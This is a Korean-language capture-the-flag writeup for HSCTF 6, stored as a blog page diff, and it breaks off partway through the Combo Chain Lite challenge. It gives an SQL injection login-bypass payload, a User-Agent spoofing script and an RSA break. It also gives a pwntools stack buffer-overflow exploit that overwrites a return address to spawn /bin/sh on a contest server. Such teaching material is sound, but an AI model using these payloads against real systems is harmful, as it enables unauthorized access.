@@ -1,0 +1,2271 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="generator" content="Source Themes Academic 4.3.1">
+
+  
+
+  
+  
+  
+  
+  
+    
+    
+    
+  
+  
+
+  <meta name="author" content="j3rrry">
+
+  
+  
+  
+    
+  
+  <meta name="description" content="HSCTF 6 Writeup">
+
+  
+  <link rel="alternate" hreflang="en-us" href="https://j3rrry.netlify.com/post/hsctf-6-writeup/">
+
+  
+
+
+  
+
+  
+  
+  
+  <meta name="theme-color" content="#2962ff">
+  
+
+  
+  
+  
+  
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.8.6/css/academicons.min.css" integrity="sha256-uFVgMKfistnJAfoCUQigIl+JfUaP47GrRKjf6CTPVmw=" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.0/css/all.css" integrity="sha384-aOkxzJ5uQz7WBObEZcHvV5JvRW3TUc2rNPA7pe3AwnsUohiw1Vj2Rgx2KSOkF5+h" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" integrity="sha256-ygkqlh3CYSUri3LhQxzdcm0n1EQvH2Y+U5S2idbLtxs=" crossorigin="anonymous">
+
+    
+    
+    
+      
+    
+    
+      
+      
+        
+          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.6/styles/github.min.css" crossorigin="anonymous" title="hl-light">
+          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.6/styles/dracula.min.css" crossorigin="anonymous" title="hl-dark" disabled>
+        
+      
+    
+
+    
+
+    
+
+  
+
+  
+  
+  <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Montserrat:400,700|Roboto:400,400italic,700|Roboto+Mono">
+  
+
+  
+  
+  
+  <link rel="stylesheet" href="/css/academic.min.747d92dc45be93ba6055a623fe5bcc0a.css">
+
+  
+    
+    
+    
+    
+      
+    
+    
+    
+    <link rel="stylesheet" href="/css/academic.aedbb90aea2ab66bf490411581dc9ece.css">
+  
+
+  
+  
+    <script>
+      window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+      ga('create', 'UA-85394819-3', 'auto');
+      
+      ga('require', 'eventTracker');
+      ga('require', 'outboundLinkTracker');
+      ga('require', 'urlChangeTracker');
+      ga('send', 'pageview');
+    </script>
+    <script async src="//www.google-analytics.com/analytics.js"></script>
+    
+    <script async src="https://cdnjs.cloudflare.com/ajax/libs/autotrack/2.4.1/autotrack.js" integrity="sha512-HUmooslVKj4m6OBu0OgzjXXr+QuFYy/k7eLI5jdeEy/F4RSgMn6XRWRGkFi5IFaFgy7uFTkegp3Z0XnJf3Jq+g==" crossorigin="anonymous"></script>
+    
+  
+  
+
+  
+
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="icon" type="image/png" href="/img/icon.png">
+  <link rel="apple-touch-icon" type="image/png" href="/img/icon-192.png">
+
+  <link rel="canonical" href="https://j3rrry.netlify.com/post/hsctf-6-writeup/">
+
+  
+  
+  
+  
+    
+    
+  
+  <meta property="twitter:card" content="summary">
+  
+  <meta property="twitter:site" content="@leunja">
+  <meta property="twitter:creator" content="@leunja">
+  
+  <meta property="og:site_name" content="j3rrry">
+  <meta property="og:url" content="https://j3rrry.netlify.com/post/hsctf-6-writeup/">
+  <meta property="og:title" content="HSCTF 6 Writeup | j3rrry">
+  <meta property="og:description" content="HSCTF 6 Writeup"><meta property="og:image" content="https://j3rrry.netlify.com/img/icon-192.png">
+  <meta property="og:locale" content="en-us">
+  
+  <meta property="article:published_time" content="2019-06-05T18:56:10&#43;09:00">
+  
+  <meta property="article:modified_time" content="2019-06-05T18:56:10&#43;09:00">
+  
+
+  
+
+
+  
+
+
+
+
+
+  <title>HSCTF 6 Writeup | j3rrry</title>
+
+</head>
+
+
+<body id="top" data-spy="scroll" data-target="#TableOfContents" data-offset="71" >
+
+  <aside class="search-results" id="search">
+  <div class="container">
+    <section class="search-header">
+
+      <div class="row no-gutters justify-content-between mb-3">
+        <div class="col-6">
+          <h1>Search</h1>
+        </div>
+        <div class="col-6 col-search-close">
+          <a class="js-search" href="#"><i class="fas fa-times-circle text-muted" aria-hidden="true"></i></a>
+        </div>
+      </div>
+
+      <div id="search-box">
+        
+        <input name="q" id="search-query" placeholder="Search..." autocapitalize="off"
+        autocomplete="off" autocorrect="off" role="textbox" spellcheck="false" type="search">
+        
+      </div>
+
+    </section>
+    <section class="section-search-results">
+
+      <div id="search-hits">
+        
+      </div>
+
+    </section>
+  </div>
+</aside>
+
+
+  
+<nav class="navbar navbar-light fixed-top navbar-expand-lg py-0" id="navbar-main">
+  <div class="container">
+
+    
+      <a class="navbar-brand" href="/">j3rrry</a>
+      
+      <button type="button" class="navbar-toggler" data-toggle="collapse"
+              data-target="#navbar" aria-controls="navbar" aria-expanded="false" aria-label="Toggle navigation">
+        <span><i class="fas fa-bars"></i></span>
+      </button>
+      
+
+    
+    <div class="collapse navbar-collapse" id="navbar">
+
+      
+      
+      <ul class="navbar-nav mr-auto">
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+        
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/#about"><span>Home</span></a>
+        </li>
+
+        
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+        
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/#posts"><span>Posts</span></a>
+        </li>
+
+        
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+        
+        
+        
+        
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/malware/"><span>Malware</span></a>
+        </li>
+
+        
+        
+
+        
+
+        
+        
+        
+
+        
+        
+        
+        
+        
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/cq/"><span>CQ-RankCalc</span></a>
+        </li>
+
+        
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+        
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/#contact"><span>Contact</span></a>
+        </li>
+
+        
+        
+
+      
+      </ul>
+      <ul class="navbar-nav ml-auto">
+      
+
+        
+
+        
+        <li class="nav-item">
+          <a class="nav-link js-search" href="#"><i class="fas fa-search" aria-hidden="true"></i></a>
+        </li>
+        
+
+        
+
+        
+        <li class="nav-item">
+          <a class="nav-link js-dark-toggle" href="#"><i class="fas fa-moon" aria-hidden="true"></i></a>
+        </li>
+        
+
+      </ul>
+
+    </div>
+  </div>
+</nav>
+
+
+  <article class="article" itemscope itemtype="http://schema.org/Article">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+  
+  
+<div class="article-container pt-3">
+  <h1 itemprop="name">HSCTF 6 Writeup</h1>
+
+  
+
+  
+    
+
+
+
+<meta content="2019-06-05 18:56:10 &#43;0900 KST" itemprop="datePublished">
+<meta content="2019-06-05 18:56:10 &#43;0900 KST" itemprop="dateModified">
+
+<div class="article-metadata">
+
+  
+  
+
+  
+  <span class="article-date">
+    
+    
+      
+    
+    <time>2019-06-05</time>
+  </span>
+  
+
+  
+
+  
+  <span class="middot-divider"></span>
+  <span class="article-reading-time">
+    12 min read
+  </span>
+  
+
+  
+  
+  <span class="middot-divider"></span>
+  <a href="/post/hsctf-6-writeup/#disqus_thread"></a>
+  
+
+  
+  
+  <span class="middot-divider"></span>
+  <span class="article-categories">
+    <i class="fas fa-folder"></i>
+    <a href="/categories/ctf/">CTF</a></span>
+  
+
+  
+    
+<div class="share-box" aria-hidden="true">
+  <ul class="share">
+    <li>
+      <a class="twitter"
+         href="https://twitter.com/intent/tweet?text=HSCTF%206%20Writeup&amp;url=https%3a%2f%2fj3rrry.netlify.com%2fpost%2fhsctf-6-writeup%2f"
+         target="_blank" rel="noopener">
+        <i class="fab fa-twitter"></i>
+      </a>
+    </li>
+    <li>
+      <a class="facebook"
+         href="https://www.facebook.com/sharer.php?u=https%3a%2f%2fj3rrry.netlify.com%2fpost%2fhsctf-6-writeup%2f"
+         target="_blank" rel="noopener">
+        <i class="fab fa-facebook-f"></i>
+      </a>
+    </li>
+    <li>
+      <a class="linkedin"
+         href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fj3rrry.netlify.com%2fpost%2fhsctf-6-writeup%2f&amp;title=HSCTF%206%20Writeup"
+         target="_blank" rel="noopener">
+        <i class="fab fa-linkedin-in"></i>
+      </a>
+    </li>
+    <li>
+      <a class="weibo"
+         href="http://service.weibo.com/share/share.php?url=https%3a%2f%2fj3rrry.netlify.com%2fpost%2fhsctf-6-writeup%2f&amp;title=HSCTF%206%20Writeup"
+         target="_blank" rel="noopener">
+        <i class="fab fa-weibo"></i>
+      </a>
+    </li>
+    <li>
+      <a class="email"
+         href="mailto:?subject=HSCTF%206%20Writeup&amp;body=https%3a%2f%2fj3rrry.netlify.com%2fpost%2fhsctf-6-writeup%2f">
+        <i class="fas fa-envelope"></i>
+      </a>
+    </li>
+  </ul>
+</div>
+
+
+  
+
+</div>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+</div>
+
+
+
+  <div class="article-container">
+
+    <div class="article-style" itemprop="articleBody">
+      
+
+<p>Hsctf 6 Writeup</p>
+
+<h1 id="index">Index</h1>
+
+<ol>
+<li><a href="#web-index">Web</a><br />
+1.1 <a href="#inspect-me-index">Inspect Me</a><br />
+1.2 <a href="#agent-keith-index">Agent Keith</a> <code>#User-Agent</code><br />
+1.3 <a href="#s-q-l-index">S-Q-L</a><br /></li>
+<li><a href="#cryptography-index">Cryptography</a><br />
+2.1 <a href="#reverse-search-algorithm-index">Reverse Search Algorithm</a><br />
+2.2 <a href="#super-secure-system-index">Super Secure System</a><br /></li>
+<li><a href="#binary-exploitation-index">Binary Exploitation</a><br />
+3.1 <a href="#return-to-sender-index">Return to Sender</a><br />
+3.2 <a href="#combo-chain-lite-index">Combo Chain Lite</a><br /></li>
+<li><a href="#miscellaneous-index">Miscellaneous</a><br />
+4.1 <a href="#a-simple-conversation-index">A Simple Conversation</a><br />
+4.2 <a href="#admin-pass-index">Admin Pass</a> <code>#git</code>, <code>#log</code>, <code>#history</code><br /></li>
+<li><a href="#reversal-index">Reversal</a><br />
+5.1 <a href="#a-byte-index">A Byte</a> <code>#xor</code><br />
+5.2 <a href="#license-index">License</a> <code>#brute force</code><br />
+5.3 <a href="#tux-talk-show-2019-index">Tux Talk Show 2019</a> <code>#rand</code><br /></li>
+<li><a href="#forensics-index">Forensics</a><br />
+6.1 <a href="#chicken-crossing-index">Chicken Crossing</a> <code>#strings</code><br />
+6.2 <a href="#cool-image-index">Cool Image</a> <code>#signature</code><br />
+6.3 <a href="#cool-image-2-index">Cool Image 2</a> <code>#signature</code>, <code>#header</code><br />
+6.4 <a href="#slap-index">Slap</a> <code>#strings</code><br /></li>
+</ol>
+
+<h1 id="web-index"><a href="#index">Web</a></h1>
+
+<h2 id="inspect-me-index"><a href="#index">Inspect Me</a></h2>
+
+<pre><code class="language-diff">Inspect Me
+50
+Written by: dwang
+
+Keith's little brother messed up some things...
+
+https://inspect-me.web.chal.hsctf.com
+
+Note: There are 3 parts to the flag!
+</code></pre>
+
+<p>페이지 소스 보기를 하면
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;!doctype html&gt;</span>
+&lt;<span style="color:#f92672">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
+    &lt;<span style="color:#f92672">head</span>&gt;
+        &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt;
+        &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1, viewport-fit=cover&#34;</span>&gt;
+        &lt;<span style="color:#f92672">title</span>&gt;inspect-me&lt;/<span style="color:#f92672">title</span>&gt;
+        &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;style.css&#34;</span>&gt;
+    &lt;/<span style="color:#f92672">head</span>&gt;
+    &lt;<span style="color:#f92672">body</span>&gt;
+        &lt;<span style="color:#f92672">main</span>&gt;
+            &lt;<span style="color:#f92672">p</span>&gt;Keith was working on his CTF problem, but his little brother accidently moved the flag around. Can you help Keith find the flag?&lt;/<span style="color:#f92672">p</span>&gt;
+            <span style="color:#75715e">&lt;!-- The first part of the flag is: hsctf{that_was_ --&gt;</span>
+        &lt;/<span style="color:#f92672">main</span>&gt;
+        &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;script.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+    &lt;/<span style="color:#f92672">body</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;</code></pre></td></tr></table>
+</div>
+</div>
+12번째 줄에 주석처리로 플래그가 있다. <code>hsctf{that_was_</code><br />
+그리고 <code>style.css</code>와 <code>script.js</code>에 각각 두 번째, 세 번째 플래그가 나눠져 있다.<br />
+flag : <code>hsctf{that_was_pretty_easy_right}</code></p>
+
+<h2 id="agent-keith-index"><a href="#index">Agent Keith</a></h2>
+
+<pre><code class="language-diff">Agent Keith
+100
+Written by: dwang
+
+Keith was looking at some old browsers and made a site to hold his flag.
+
+https://agent-keith.web.chal.hsctf.com
+</code></pre>
+
+<p>사이트에 접속해보면</p>
+
+<pre><code class="language-diff">If you're not Keith, you won't get the flag!
+Your agent is: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36
+
+Flag: Access Denied
+</code></pre>
+
+<p>Keith만 flag를 얻을 수 있다면서 나의 <code>User-Agent</code>를 보여준다.
+페이지 소스를 보면</p>
+
+<pre><code class="language-html">&lt;!doctype html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+    &lt;head&gt;
+        &lt;meta charset=&quot;utf-8&quot;&gt;
+        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, viewport-fit=cover&quot;&gt;
+        &lt;title&gt;agent-keith&lt;/title&gt;
+        &lt;link rel=&quot;stylesheet&quot; href=&quot;http://localhost:8002/static/style.css&quot;&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;main&gt;
+            &lt;h2&gt;If you're not Keith, you won't get the flag!&lt;/h2&gt;
+            &lt;p&gt;&lt;b&gt;Your agent is:&lt;/b&gt; Keith&lt;/p&gt;
+            &lt;p&gt;&lt;b&gt;Flag:&lt;/b&gt; Access Denied&lt;/p&gt;
+            &lt;!-- DEBUG (remove me!!): NCSA_Mosaic/2.0 (Windows 3.1) --&gt;
+        &lt;/main&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p><code>NCSA_Mosaic/2.0 (Windows 3.1)</code> 개발자가 디버깅 할 시 남겨놨던 주석이 보인다.</p>
+
+<pre><code class="language-python">import requests
+
+headers = {
+            'user-agent': 'NCSA_Mosaic/2.0 (Windows 3.1)'
+            }
+url = 'https://agent-keith.web.chal.hsctf.com/'
+res = requests.get(url, headers=headers)
+text = res.text
+print(text)
+</code></pre>
+
+<p>파이썬 코드를 이용해서 풀었습니다.<br />
+flag : <code>hsctf{wow_you_are_agent_keith_now}</code></p>
+
+<h2 id="s-q-l-index"><a href="#index">S-Q-L</a></h2>
+
+<pre><code class="language-diff">S-Q-L
+100
+Written by: dwang
+
+Keith keeps trying to keep his flag safe. This time, he used a database and some PHP.
+
+https://s-q-l.web.chal.hsctf.com/
+</code></pre>
+
+<p>로그인 페이지에 SQL Injection하는 문제입니다.<br />
+공격 쿼리 : <code>admin' or 1=1;#</code></p>
+
+<pre><code>Hello Keith!
+The flag is hsctf{mysql_real_escape_string}
+</code></pre>
+
+<h1 id="cryptography-index"><a href="#index">Cryptography</a></h1>
+
+<h2 id="reverse-search-algorithm-index"><a href="#index">Reverse Search Algorithm</a></h2>
+
+<pre><code class="language-diff">Reverse Search Algorithm
+100
+Written by: Tux
+
+Reverse Search Algorithm
+WWPHSN students, gotta get these points to boost your grade.
+
+n = 561985565696052620466091856149686893774419565625295691069663316673425409620917583731032457879432617979438142137
+e = 65537
+c = 328055279212128616898203809983039708787490384650725890748576927208883055381430000756624369636820903704775835777
+</code></pre>
+
+<pre><code class="language-python">import gmpy2
+
+n = 561985565696052620466091856149686893774419565625295691069663316673425409620917583731032457879432617979438142137
+e = 65537
+c = 328055279212128616898203809983039708787490384650725890748576927208883055381430000756624369636820903704775835777
+
+p = 29
+q = 19378812610208711050554891591368513578428260883630885898953907471497427917962675301070084754463193723428901453
+phi = (p-1) * (q-1)
+
+d = gmpy2.invert(e,phi)
+
+print hex(gmpy2.powmod(c,d,n))[2:].decode('hex')
+</code></pre>
+
+<p>flag : <code>hsctf{y3s_rsa_1s_s0lved_10823704961253}</code></p>
+
+<h2 id="super-secure-system-index"><a href="#index">Super Secure System</a></h2>
+
+<pre><code class="language-python">r = remote('crypto.hsctf.com', 8111)
+
+r.recvuntil(': ')
+secret = r.recvline()[:-1]
+
+#context.log_level = 'debug'
+
+s = 'hsctf{h0w_d3d_y3u_de3cryP4_th3_s1p3R_s3cuR3_m355a9e?}'
+p = log.progress('')
+for c in '?_{}'+string.ascii_lowercase+string.digits+string.ascii_uppercase:
+    p.status(c)
+    r.sendlineafter(': ', s+c)
+    r.recvuntil(': ')
+    test = r.recvline()[:-1]
+    length = 2 * (len(s)+1)
+    if secret[:length] == test:
+        print repr(secret)
+        print repr(c)
+        print repr(test)
+        p.success(c)
+        break
+
+r.interactive()
+</code></pre>
+
+<h1 id="binary-exploitation-index"><a href="#index">Binary Exploitation</a></h1>
+
+<h2 id="return-to-sender-index"><a href="#index">Return to Sender</a></h2>
+
+<pre><code class="language-diff">Return to Sender
+227
+Written by: Ptomerty
+
+Who knew the USPS could lose a letter so many times?
+
+nc pwn.hsctf.com 1234
+
+6/3/19 7:34 AM: Updated binary, SHA-1: 104fb76c3318fb44130c4a8ee50ac1a2f52d4082 return-to-sender
+</code></pre>
+
+<p>바이너리와 C언어 소스 코드를 제공하고 있습니다.
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">win</span>() {
+    system(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>);
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>() {
+    <span style="color:#66d9ef">char</span> dest[<span style="color:#ae81ff">8</span>];
+    printf(<span style="color:#e6db74">&#34;Where are you sending your mail to today? &#34;</span>);
+    gets(dest);
+    printf(<span style="color:#e6db74">&#34;Alright, to %s it goes!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, dest);
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+    setbuf(stdout, NULL);
+    gid_t gid <span style="color:#f92672">=</span> getegid();
+    setresgid(gid,gid,gid);
+    vuln();
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}</code></pre></td></tr></table>
+</div>
+</div>
+함수 win()으로 리턴 주소를 덮는 문제입니다. 취약한 함수는 12번째 줄의 gets()입니다. 리턴 주소까지의 거리(길이)는 얼마나 될지 디버깅을 통해 확인합니다.
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">vuln</span>()
+{
+  <span style="color:#66d9ef">char</span> s; <span style="color:#75715e">// [sp+8h] [bp-10h]@1
+</span><span style="color:#75715e"></span>
+  printf(<span style="color:#e6db74">&#34;Where are you sending your mail to today? &#34;</span>);
+  gets(<span style="color:#f92672">&amp;</span>s);
+  <span style="color:#66d9ef">return</span> printf(<span style="color:#e6db74">&#34;Alright, to %s it goes!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">&amp;</span>s);
+}</code></pre></td></tr></table>
+</div>
+</div>
+3번째 줄을 보면 지역변수 s는 bp-0x10에 위치하고 있습니다. 따라서, sfp가 4바이트를 차지하므로 리턴 주소까지 거리는 0x14입니다.</p>
+
+<pre><code class="language-c">+-------------+--------------+--------+--------+
+|   dest[8]   |   dummy[8]   | sfp[4] | ret[4] |
++-------------+--------------+--------+--------+
+</code></pre>
+
+<pre><code class="language-python">payload = ''
+payload += 'a' * 0x14
+</code></pre>
+
+<p>그리고 리턴 주소는 win()의 주소가 들어갑니다.</p>
+
+<pre><code class="language-python">e = ELF('./return-to-sender')
+
+payload = ''
+payload += 'a' * 0x14
+payload += e.sym.win
+</code></pre>
+
+<pre><code class="language-python">e = ELF('./return-to-sender')
+r = remote('pwn.hsctf.com', 1234)
+
+payload = ''
+payload += 'a' * 0x14
+payload += e.sym.win
+
+r.sendlineafter('? ', payload)
+r.interactive()
+</code></pre>
+
+<pre><code class="language-shell">Alright, to aaaaaaaaaaaaaaaaaaaa\xb6\x91\x0 it goes!
+$ cat flag
+hsctf{fedex_dont_fail_me_now}
+</code></pre>
+
+<h2 id="combo-chain-lite-index"><a href="#index">Combo Chain Lite</a></h2>
+
+<pre><code class="language-diff">Combo Chain Lite
+400
+Written by: Ptomerty
+
+Training wheels!
+
+nc pwn.hsctf.com 3131
+</code></pre>
+
+<p>바이너리와 소스코드를 제공해줍니다.
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
